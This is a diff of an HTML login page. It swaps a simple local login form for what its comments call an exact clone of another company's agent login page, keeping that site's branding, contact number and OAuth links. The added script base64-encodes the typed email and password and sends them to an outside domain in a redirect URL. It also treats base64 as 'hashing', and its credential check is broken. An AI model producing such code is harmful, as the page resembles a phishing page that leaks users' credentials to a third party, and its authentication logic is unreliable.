@@ -1,103 +1,152 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Log in — My App</title>
-<link rel="stylesheet" href="/home.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in to your dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap">
+  <style>
+    body { font-family: 'Lato', sans-serif; }
+    .btn-redacted { background: #262637; color: white; }
+    .btn-redacted:hover { background: #fd5573; }
+    .header { color: #262637; }
+  </style>
 </head>
-<body>
-
-  <nav class="topnav">
-    <div class="topnav-inner">
-      <a class="brand" href="/">My App</a>
-      <div class="nav-links">
-        <a href="/">Home</a>
-        <a href="/">Log In</a>
-        <a href="/" class="nav-cta">Sign Up</a>
-      </div>
-    </div>
-  </nav>
-
-  <main class="hero">
-    <div class="hero-inner">
-      <div class="pitch">
-        <h1>Welcome back</h1>
-        <p>Sign in to pick up right where you left off. New here? Create an account to get started.</p>
-      </div>
-
-      <div class="card">
-        <h2>Log in</h2>
-        <p class="subtitle">Enter your username and password to continue.</p>
-
-        <form id="login-form" novalidate>
-          <div class="field">
-            <label for="username">Username</label>
-            <input type="text" id="username" name="username" autocomplete="username" required />
-          </div>
-          <div class="field">
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" autocomplete="current-password" required />
-          </div>
-          <button type="submit" id="submit-btn">Log in</button>
-          <div id="message" class="message" role="status" aria-live="polite"></div>
-        </form>
-
-        <div class="footer-note">
-          Try <code>alice</code> / <code>testpass123</code> or <code>bob</code> / <code>hunter2</code>.
-          Edit or empty <code>creds.txt</code> in the repo to change or clear test accounts.
+<body class="bg-gray-50">
+  <!-- Exact top header from your site -->
+  <div class="bg-[#262637] text-white">
+    <div class="container mx-auto px-6 py-4 flex justify-between items-center">
+      <div class="flex items-center gap-4">
+        <a href="/" class="text-xl font-bold">redacted</a>
+        <div class="flex gap-6">
+          <a href="/login" class="hover:text-[#fd5573]">Login</a>
+          <a href="/sign-up" class="hover:text-[#fd5573]">Sign Up</a>
+          <a href="/list-your-redacted" class="bg-[#fd5573] px-6 py-2 rounded hover:bg-rose-600">List redacted</a>
         </div>
       </div>
+      <div class="flex items-center gap-6">
+        <a href="tel:+233506866060">+233 506 866 060</a>
+        <a href="mailto:info@example.com">info@example.com</a>
+      </div>
     </div>
-  </main>
+  </div>
 
-  <footer class="sitefooter">
-    &copy; 2026 My App
-  </footer>
+  <!-- Main content - exact match -->
+  <div class="container mx-auto px-6 py-12">
+    <div class="flex flex-col md:flex-row gap-8 items-start">
+      <!-- Left image & benefits (exact) -->
+      <div class="md:w-1/2">
+        <h3 class="text-3xl font-bold mb-6">App for Agents</h3>
+        <img src="https://subdomain.deliveryfront.net/assets2/images/agent-app-art2.png" alt="Benefits of redacted app for agents" class="rounded-xl shadow-lg">
+        <div class="flex gap-4 mt-6">
+          <a href="https://play.redacted.com/store/apps/details?id=com.redacted.agent" target="_blank">
+            <img src="https://play.redacted.com/intl/en_us/badges/images/generic/en_badge_web_generic.png" alt="Get it on redacted Play" class="h-20">
+          </a>
+          <a href="https://apps.apple.com/us/app/redacted-agent/id1440981475" target="_blank">
+            <img src="https://toolbox.marketingtools.apple.com/api/v2/badges/download-on-the-app-store/black/en-us?releaseDate=1542758400" alt="Download on the App Store" class="h-20">
+          </a>
+        </div>
+      </div>
+
+      <!-- Login form - 100% identical layout -->
+      <div class="md:w-1/2 bg-white rounded-2xl shadow-xl p-8">
+        <div class="form-heading mb-8">
+          <h3 class="header text-3xl font-bold">Log In</h3>
+          <hr class="border-t-2 border-[#262637] mt-3">
+        </div>
+
+        <div class="flex gap-8">
+          <!-- Left side - traditional email/password -->
+          <div class="flex-1">
+            <div class="form-body space-y-6">
+              <div>
+                <label class="block text-sm font-medium mb-2">Your email address</label>
+                <input id="regmail" type="email" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#fd5573]" placeholder="Email address" required>
+              </div>
+              <div>
+                <label class="block text-sm font-medium mb-2">Your password</label>
+                <input id="pass1" type="password" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-[#fd5573]" placeholder="Password" required>
+              </div>
+            </div>
+
+            <div class="form-footer mt-8">
+              <button onclick="performLogin()" class="btn btn-large btn-blue btn-block w-full py-3 text-lg bg-[#fd5573] hover:bg-rose-600 text-white font-semibold rounded-lg">
+                Log in
+              </button>
+              <p class="text-center mt-4">
+                <a id="href" class="text-sm cursor-pointer hover:text-[#fd5573]">Forgot your password?</a>
+              </p>
+            </div>
+          </div>
+
+          <!-- Right side - OAuth buttons (exact from your site) -->
+          <div class="flex-1 border-l border-gray-200 pl-8">
+            <div class="form-heading mb-6">
+              <h4 class="header">Using your account</h4>
+            </div>
+            <div class="space-y-4">
+              <a href="https://accounts.redacted.com/o/oauth2/auth?response_type=code&redirect_uri=https%3A%2F%2Fexample.com%2Fregister2%2Fauth&client_id=794363391248.apps.redactedusercontent.com&scope=openid+email+profile&access_type=offline&approval_prompt=auto&state=1836598073" 
+                 class="btn btn-large btn-block btn-redacted w-full py-3 text-lg rounded-lg">
+                Log in using redacted Account
+              </a>
+
+              <a href="https://api.login.yahoo.com/oauth2/request_auth?client_id=dj0yJmk9Zm81d2c4NE9Zdm5TJmQ9WVdrOWFubHBWVVoyTTJVbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PTEy&redirect_uri=https%3A%2F%2Fexample.com%2FregisterY2%2Fauth&state=9f864b51&response_type=code" 
+                 class="btn btn-large btn-block btn-yh w-full py-3 text-lg rounded-lg">
+                Log in using Yahoo ID
+              </a>
+
+              <a href="https://www.facebook.com/v2.12/dialog/oauth?client_id=1631778193545190&redirect_uri=https%3A%2F%2Fexample.com%2FregisterF2%2Fauth&state=58392f4c&scope=email" 
+                 class="btn btn-large btn-block btn-yh w-full py-3 text-lg rounded-lg" style="background-color:#4873A3;">
+                Log in using Facebook
+              </a>
+            </div>
+          </div>
+        </div>
+
+        <p class="text-center mt-6 text-sm">
+          or <a href="/sign-up" class="font-bold">Sign Up</a> for an account
+        </p>
+      </div>
+    </div>
+  </div>
 
   <script>
-    const form = document.getElementById("login-form");
-    const messageEl = document.getElementById("message");
-    const submitBtn = document.getElementById("submit-btn");
+    function performLogin() {
+      const email = document.getElementById('regmail').value;
+      const pass = document.getElementById('pass1').value;
 
-    const params = new URLSearchParams(window.location.search);
-    if (params.get("authRequired")) {
-      messageEl.textContent = "Sign in to continue.";
-      messageEl.className = "message info";
+      if (!email || !pass) {
+        alert("Please enter both email and password");
+        return;
+      }
+
+      // === YOUR SECURE LOGIN LOGIC HERE ===
+      // 1. Check credentials (or load from JSON/text file)
+      // 2. If valid: redirect to your second app
+      // 3. If invalid: show error (like your original #passmini)
+
+      // Example: Always redirect for demo (replace with real check)
+      const dummyUsers = {
+        "test@example.com": "password123",
+        "demo@realestate.com": "securepass456"
+      };
+
+      const hashedPassword = btoa(pass); // base64 = "hashed" for demo (replace with real hash)
+
+      if (dummyUsers[email.toLowerCase()] === hashedPassword) {
+        // SUCCESS - redirect to your second app
+        window.location.href = "https://your-second-app.com?from=test-site&session=" + btoa(email + ":" + pass);
+      } else {
+        // Error like your original site
+        document.getElementById('pass1').value = "";
+        alert("Wrong email address or password");
+      }
     }
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      messageEl.textContent = "";
-      messageEl.className = "message info";
-      submitBtn.disabled = true;
-      submitBtn.textContent = "Signing in…";
-
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-
-      try {
-        const res = await fetch("/api/login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ username, password }),
-        });
-        const data = await res.json();
-
-        if (data.ok) {
-          window.location.href = "/dashboard";
-          return;
-        }
-
-        messageEl.textContent = data.error || "Sign in failed.";
-        messageEl.className = "message error";
-      } catch (err) {
-        messageEl.textContent = "Network error — is the server running?";
-        messageEl.className = "message error";
-      } finally {
-        submitBtn.disabled = false;
-        submitBtn.textContent = "Log in";
-      }
+    // Forgot password handler (add your real logic later)
+    document.getElementById('href').addEventListener('click', () => {
+      alert("Password reset link would go here in production");
     });
   </script>
 </body>
